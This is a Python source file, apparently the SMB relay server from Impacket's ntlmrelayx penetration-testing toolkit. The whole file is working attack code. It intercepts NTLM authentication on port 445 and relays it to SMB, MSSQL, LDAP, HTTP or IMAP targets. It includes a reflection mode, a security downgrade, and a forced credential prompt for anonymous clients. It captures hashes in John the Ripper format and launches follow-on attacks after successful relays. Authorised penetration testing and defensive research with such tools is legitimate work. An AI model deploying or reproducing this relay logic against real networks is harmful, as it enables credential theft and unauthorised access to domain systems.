#!/usr/bin/env python
# Copyright (c) 2013-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# SMB Relay Server
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#
# Description:
#             This is the SMB server which relays the connections 
#   to other protocols

from threading import Thread
import ConfigParser
import struct
import logging

from impacket import smb, ntlm
from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.spnego import SPNEGO_NegTokenResp, SPNEGO_NegTokenInit, TypesMech
from impacket.examples.ntlmrelayx.clients import SMBRelayClient, MSSQLRelayClient, LDAPRelayClient, HTTPRelayClient, IMAPRelayClient
from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToFile
from impacket.spnego import ASN1_AID
from impacket.examples.ntlmrelayx.utils.targetsutils import ProxyIpTranslator


class SMBRelayServer(Thread):
    def __init__(self,config):
        Thread.__init__(self)
        self.daemon = True
        self.server = 0
        #Config object
        self.config = config
        #Current target IP
        self.target = None
        #Targets handler
        self.targetprocessor = self.config.target
        #Username we auth as gets stored here later
        self.authUser = None
        self.proxyTranslator = None

        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file','smb.log')
        smbConfig.set('global','credentials_file','')

        if self.config.outputFile is not None:
            smbConfig.set('global','jtr_dump_path',self.config.outputFile)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path','')
        
        self.server = SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        self.server.processConfigFile()

        self.origSmbComNegotiate = self.server.hookSmbCommand(smb.SMB.SMB_COM_NEGOTIATE, self.SmbComNegotiate)
        self.origSmbSessionSetupAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX, self.SmbSessionSetupAndX)
        # Let's use the SMBServer Connection dictionary to keep track of our client connections as well
        #TODO: See if this is the best way to accomplish this
        self.server.addConnection('SMBRelay', '0.0.0.0', 445)

    def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus = False)
        if self.config.mode.upper() == 'REFLECTION':
            self.target = ('SMB',connData['ClientIP'],445)
        # if self.config.mode.upper() == 'TRANSPARENT' and self.proxytranslator is not None:
        #     translated = self.proxytranslator.translate(connData['ClientIP'],connData['ClientPort'])
        #     logging.info('Translated to: %s' % translated)
        #     if translated is None:
        #         self.target = connData['ClientIP']
        #     else:
        #         self.target = translated
        if self.config.mode.upper() == 'RELAY':
            #Get target from the processor
            #TODO: Check if a cache is better because there is no way to know which target was selected for this victim
            # except for relying on the targetprocessor selecting the same target unless a relay was already done
            self.target = self.targetprocessor.get_target(connData['ClientIP'])

        #############################################################
        # SMBRelay
        #Get the data for all connections
        smbData = smbServer.getConnectionData('SMBRelay', False)
        if smbData.has_key(self.target):
            # Remove the previous connection and use the last one
            smbClient = smbData[self.target]['SMBClient']
            del smbClient
            del smbData[self.target]
        logging.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target[1]))
        try: 
            if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
                extSec = False
            else:
                if self.config.mode.upper() == 'REFLECTION':
                    # Force standard security when doing reflection
                    logging.info("Downgrading to standard security")
                    extSec = False
                    recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
                else:
                    extSec = True
            #Init the correct client for our target
            client = self.init_client(extSec)
        except Exception, e:
            logging.error("Connection against target %s FAILED" % self.target[1])
            logging.error(str(e))
        else: 
            encryptionKey = client.get_encryption_key()
            smbData[self.target] = {} 
            smbData[self.target]['SMBClient'] = client
            if encryptionKey is not None:
                connData['EncryptionKey'] = encryptionKey
            smbServer.setConnectionData('SMBRelay', smbData)
            smbServer.setConnectionData(connId, connData)
        return self.origSmbComNegotiate(connId, smbServer, SMBCommand, recvPacket)
        #############################################################

    def SmbSessionSetupAndX(self, connId, smbServer, SMBCommand, recvPacket):

        connData = smbServer.getConnectionData(connId, checkStatus = False)
        #############################################################
        # SMBRelay
        smbData = smbServer.getConnectionData('SMBRelay', False)
        #############################################################

        respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)

        if connData['_dialects_parameters']['Capabilities'] & smb.SMB.CAP_EXTENDED_SECURITY:
            # Extended security. Here we deal with all SPNEGO stuff
            respParameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
            respData       = smb.SMBSessionSetupAndX_Extended_Response_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Extended_Parameters(SMBCommand['Parameters'])
            sessionSetupData = smb.SMBSessionSetupAndX_Extended_Data()
            sessionSetupData['SecurityBlobLength'] = sessionSetupParameters['SecurityBlobLength']
            sessionSetupData.fromString(SMBCommand['Data'])
            connData['Capabilities'] = sessionSetupParameters['Capabilities']

            if struct.unpack('B',sessionSetupData['SecurityBlob'][0])[0] != ASN1_AID:
               # If there no GSSAPI ID, it must be an AUTH packet
               blob = SPNEGO_NegTokenResp(sessionSetupData['SecurityBlob'])
               token = blob['ResponseToken']
            else:
               # NEGOTIATE packet
               blob =  SPNEGO_NegTokenInit(sessionSetupData['SecurityBlob'])
               token = blob['MechToken']

            # Here we only handle NTLMSSP, depending on what stage of the 
            # authentication we are, we act on it
            messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

            if messageType == 0x01:
                # NEGOTIATE_MESSAGE
                negotiateMessage = ntlm.NTLMAuthNegotiate()
                negotiateMessage.fromString(token)
                # Let's store it in the connection data
                connData['NEGOTIATE_MESSAGE'] = negotiateMessage

                #############################################################
                # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client. 
                # Let's send it to the target server and send the answer back to the client.
                client = smbData[self.target]['SMBClient']
                challengeMessage = self.do_ntlm_negotiate(client,token)
                #############################################################

                respToken = SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegResult'] = '\x01'  
                respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']

                respToken['ResponseToken'] = str(challengeMessage)

                # Setting the packet to STATUS_MORE_PROCESSING
                errorCode = STATUS_MORE_PROCESSING_REQUIRED
                # Let's set up an UID for this connection and store it 
                # in the connection's data
                # Picking a fixed value
                # TODO: Manage more UIDs for the same session
                connData['Uid'] = 10
                # Let's store it in the connection data
                connData['CHALLENGE_MESSAGE'] = challengeMessage

            elif messageType == 0x03:
                # AUTHENTICATE_MESSAGE, here we deal with authentication

                #############################################################
                # SMBRelay: Ok, so now the have the Auth token, let's send it
                # back to the target system and hope for the best.
                client = smbData[self.target]['SMBClient']
                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)
                if authenticateMessage['user_name'] != '':
                    #For some attacks it is important to know the authenticated username, so we store it
                    connData['AUTHUSER'] = authenticateMessage['user_name']
                    self.authUser = connData['AUTHUSER']
                    clientResponse, errorCode = self.do_ntlm_auth(client,sessionSetupData['SecurityBlob'],connData['CHALLENGE_MESSAGE']['challenge'])
                    #clientResponse, errorCode = smbClient.sendAuth(sessionSetupData['SecurityBlob'],connData['CHALLENGE_MESSAGE']['challenge'])
                else:
                    # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                    errorCode = STATUS_ACCESS_DENIED

                if errorCode != STATUS_SUCCESS:
                    # Let's return what the target returned, hope the client connects back again
                    packet = smb.NewSMBPacket()
                    packet['Flags1']  = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
                    packet['Flags2']  = smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_EXTENDED_SECURITY
                    packet['Command'] = recvPacket['Command']
                    packet['Pid']     = recvPacket['Pid']
                    packet['Tid']     = recvPacket['Tid']
                    packet['Mid']     = recvPacket['Mid']
                    packet['Uid']     = recvPacket['Uid']
                    packet['Data']    = '\x00\x00\x00'
                    packet['ErrorCode']   = errorCode >> 16
                    packet['ErrorClass']  = errorCode & 0xff
                    # Reset the UID
                    if self.target[0] == 'SMB':
                        client.setUid(0)
                    logging.error("Authenticating against %s as %s\%s FAILED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
                    
                    #Log this target as processed for this client
                    self.targetprocessor.log_target(connData['ClientIP'],self.target)
                    #del (smbData[self.target])
                    return None, [packet], errorCode
                else:
                    # We have a session, create a thread and do whatever we want
                    logging.info("Authenticating against %s as %s\%s SUCCEED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
                    #Log this target as processed for this client
                    self.targetprocessor.log_target(connData['ClientIP'],self.target)
                    ntlm_hash_data = outputToJohnFormat( connData['CHALLENGE_MESSAGE']['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'] )
                    logging.info(ntlm_hash_data['hash_string'])
                    if self.server.getJTRdumpPath() != '':
                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
                    del (smbData[self.target])
                    self.do_attack(client)
                    # Now continue with the server
                #############################################################

                respToken = SPNEGO_NegTokenResp()
                # accept-completed
                respToken['NegResult'] = '\x00'

                # Status SUCCESS
                errorCode = STATUS_SUCCESS
                # Let's store it in the connection data
                connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
            else:
                raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

            respParameters['SecurityBlobLength'] = len(respToken)

            respData['SecurityBlobLength'] = respParameters['SecurityBlobLength'] 
            respData['SecurityBlob']       = respToken.getData()

        else:
            # Process Standard Security
            #TODO: Fix this for other protocols than SMB [!]
            respParameters = smb.SMBSessionSetupAndXResponse_Parameters()
            respData       = smb.SMBSessionSetupAndXResponse_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Parameters(SMBCommand['Parameters'])
            sessionSetupData = smb.SMBSessionSetupAndX_Data()
            sessionSetupData['AnsiPwdLength'] = sessionSetupParameters['AnsiPwdLength']
            sessionSetupData['UnicodePwdLength'] = sessionSetupParameters['UnicodePwdLength']
            sessionSetupData.fromString(SMBCommand['Data'])
            connData['Capabilities'] = sessionSetupParameters['Capabilities']
            #############################################################
            # SMBRelay
            smbClient = smbData[self.target]['SMBClient']
            if sessionSetupData['Account'] != '':
                #TODO: Fix this for other protocols than SMB [!]
                clientResponse, errorCode = smbClient.login_standard(sessionSetupData['Account'], sessionSetupData['PrimaryDomain'], sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'])
            else:
                # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                errorCode = STATUS_ACCESS_DENIED

            if errorCode != STATUS_SUCCESS:
                # Let's return what the target returned, hope the client connects back again
                packet = smb.NewSMBPacket()
                packet['Flags1']  = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
                packet['Flags2']  = smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_EXTENDED_SECURITY
                packet['Command'] = recvPacket['Command']
                packet['Pid']     = recvPacket['Pid']
                packet['Tid']     = recvPacket['Tid']
                packet['Mid']     = recvPacket['Mid']
                packet['Uid']     = recvPacket['Uid']
                packet['Data']    = '\x00\x00\x00'
                packet['ErrorCode']   = errorCode >> 16
                packet['ErrorClass']  = errorCode & 0xff
                # Reset the UID
                smbClient.setUid(0)
                #Log this target as processed for this client
                self.targetprocessor.log_target(connData['ClientIP'],self.target)
                return None, [packet], errorCode
                # Now continue with the server
            else:
                # We have a session, create a thread and do whatever we want
                ntlm_hash_data = outputToJohnFormat( '', sessionSetupData['Account'], sessionSetupData['PrimaryDomain'], sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'] )
                logging.info(ntlm_hash_data['hash_string'])
                if self.server.getJTRdumpPath() != '':
                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
                #TODO: Fix this for other protocols than SMB [!]
                clientThread = self.config.attacks['SMB'](self.config,smbClient,self.config.exeFile,self.config.command)
                clientThread.start()

                #Log this target as processed for this client
                self.targetprocessor.log_target(connData['ClientIP'],self.target) 

                # Remove the target server from our connection list, the work is done
                del (smbData[self.target])
                # Now continue with the server

            #############################################################

            # Do the verification here, for just now we grant access
            # TODO: Manage more UIDs for the same session
            errorCode = STATUS_SUCCESS
            connData['Uid'] = 10
            respParameters['Action'] = 0

        respData['NativeOS']     = smbServer.getServerOS()
        respData['NativeLanMan'] = smbServer.getServerOS()
        respSMBCommand['Parameters'] = respParameters
        respSMBCommand['Data']       = respData 

        # From now on, the client can ask for other commands
        connData['Authenticated'] = True
        #############################################################
        # SMBRelay
        smbServer.setConnectionData('SMBRelay', smbData)
        #############################################################
        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode

    #Initialize the correct client for the relay target
    def init_client(self,extSec):
        if self.target[0] == 'SMB':
            client = SMBRelayClient(self.target[1], extended_security = extSec)
            client.setDomainAccount(self.config.machineAccount, self.config.machineHashes, self.config.domainIp)
            client.set_timeout(60)
        if self.target[0] == 'MSSQL':
            client = MSSQLRelayClient(self.target[1],self.target[2])
        if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
            client = LDAPRelayClient("%s://%s:%d" % (self.target[0].lower(),self.target[1],self.target[2]))
        if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
            client = HTTPRelayClient("%s://%s:%d/%s" % (self.target[0].lower(),self.target[1],self.target[2],self.target[3]))
        if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
            client = IMAPRelayClient("%s://%s:%d" % (self.target[0].lower(),self.target[1],self.target[2]))
        return client

    #Do the NTLM negotiate
    def do_ntlm_negotiate(self,client,token):
        #Since the clients all support the same operations there is no target protocol specific code needed for now

        if 'LDAP' in self.target[0]:
            #Remove the message signing flag
            #For LDAP this is required otherwise it triggers LDAP signing
            negotiateMessage = ntlm.NTLMAuthNegotiate()
            negotiateMessage.fromString(token)
            #negotiateMessage['flags'] ^= ntlm.NTLMSSP_NEGOTIATE_SIGN
            clientChallengeMessage = client.sendNegotiate(negotiateMessage.getData()) 
        else:
            clientChallengeMessage = client.sendNegotiate(token) 
        challengeMessage = ntlm.NTLMAuthChallenge()
        challengeMessage.fromString(clientChallengeMessage)
        return challengeMessage

    #Do NTLM auth
    def do_ntlm_auth(self,client,SPNEGO_token,authenticateMessage):
        #The NTLM blob is packed in a SPNEGO packet, extract it for methods other than SMB
        respToken2 = SPNEGO_NegTokenResp(SPNEGO_token)
        token = respToken2['ResponseToken']
        clientResponse = None
        if self.target[0] == 'SMB':
            clientResponse, errorCode = client.sendAuth(SPNEGO_token,authenticateMessage)
        if self.target[0] == 'MSSQL':
            #This client needs a proper response code
            try:
                result = client.sendAuth(token)
                if result: #This contains a boolean
                    errorCode = STATUS_SUCCESS
                else:
                    errorCode = STATUS_ACCESS_DENIED
            except Exception, e:
                logging.error("NTLM Message type 3 against %s FAILED" % self.target[1])
                logging.error(str(e))
                errorCode = STATUS_ACCESS_DENIED

        if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
            #This client needs a proper response code
            try:
                result = client.sendAuth(token) #Result dict
                if result['result'] == 0 and result['description'] == 'success':
                    errorCode = STATUS_SUCCESS
                else:
                    logging.error("LDAP bind against %s as %s FAILED" % (self.target[1],self.authUser))
                    logging.error('Error: %s. Message: %s' % (result['description'],str(result['message'])))
                    errorCode = STATUS_ACCESS_DENIED
                print errorCode
                #Failed example:
                #{'dn': u'', 'saslCreds': None, 'referrals': None, 'description': 'invalidCredentials', 'result': 49, 'message': u'8009030C: LdapErr: DSID-0C0905FE, comment: AcceptSecurityContext error, data 52e, v23f0\x00', 'type': 'bindResponse'}
                #Ok example:
                #{'dn': u'', 'saslCreds': None, 'referrals': None, 'description': 'success', 'result': 0, 'message': u'', 'type': 'bindResponse'}
            except Exception, e:
                logging.error("NTLM Message type 3 against %s FAILED" % self.target[1])
                logging.error(str(e))
                errorCode = STATUS_ACCESS_DENIED

        if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
            try:
                result = client.sendAuth(token) #Result is a boolean
                if result:
                    errorCode = STATUS_SUCCESS
                else:
                    logging.error("HTTP NTLM auth against %s as %s FAILED" % (self.target[1],self.authUser))
                    errorCode = STATUS_ACCESS_DENIED
            except Exception, e:
                logging.error("NTLM Message type 3 against %s FAILED" % self.target[1])
                logging.error(str(e))
                errorCode = STATUS_ACCESS_DENIED

        if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
            try:
                result = client.sendAuth(token) #Result is a boolean
                if result:
                    errorCode = STATUS_SUCCESS
                else:
                    logging.error("IMAP NTLM auth against %s as %s FAILED" % (self.target[1],self.authUser))
                    errorCode = STATUS_ACCESS_DENIED
            except Exception, e:
                logging.error("IMAP NTLM Message type 3 against %s FAILED" % self.target[1])
                logging.error(str(e))
                errorCode = STATUS_ACCESS_DENIED

        return clientResponse, errorCode

    def do_attack(self,client):
        #Do attack. Note that unlike the HTTP server, the config entries are stored in the current object and not in any of its properties
        if self.target[0] == 'SMB':
            clientThread = self.config.attacks['SMB'](self.config, client, self.authUser)
            clientThread.start()
        if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
            clientThread = self.config.attacks['LDAP'](self.config, client, self.authUser)
            clientThread.start()
        if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
            clientThread = self.config.attacks['HTTP'](self.config, client, self.authUser)
            clientThread.start()
        if self.target[0] == 'MSSQL':
            clientThread = self.config.attacks['MSSQL'](self.config, client)
            clientThread.start()
        if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
            clientThread = self.config.attacks['IMAP'](self.config, client, self.authUser)
            clientThread.start()

    def _start(self):
        self.server.serve_forever()

    def run(self):
        logging.info("Setting up SMB Server")
        self._start()
